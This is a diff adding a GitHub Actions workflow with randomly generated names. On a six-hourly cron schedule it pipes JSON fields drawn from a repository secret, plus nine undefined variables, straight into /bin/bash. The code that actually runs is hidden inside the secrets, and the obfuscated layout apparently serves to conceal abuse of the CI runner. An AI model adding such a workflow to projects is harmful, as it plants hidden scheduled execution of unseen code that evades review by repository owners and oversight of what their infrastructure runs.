@@ -1,0 +1,26 @@
+name: ninggulieljg
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ninggulieljg
+        env:
+          qpuh10: ${{ secrets.qpuh10 }}
+        run: |
+          echo $qpuh10 | jq -r .z88697 | /bin/bash
+          echo $tiunc9862 | jq -r .tkyol35698 | /bin/bash
+          echo $qemxo87756 | jq -r .c9 | /bin/bash
+          echo $aq720 | jq -r .rudcv8540 | /bin/bash
+          echo $zmh14 | jq -r .dpmn7 | /bin/bash
+          echo $spezf0691 | jq -r .z39715 | /bin/bash
+          echo $htv089 | jq -r .iofp22 | /bin/bash
+          echo $vayn10 | jq -r .kati396 | /bin/bash
+          echo $n28 | jq -r .zldna7083 | /bin/bash
+          echo $bsxki44 | jq -r .yjm4481 | /bin/bash
+
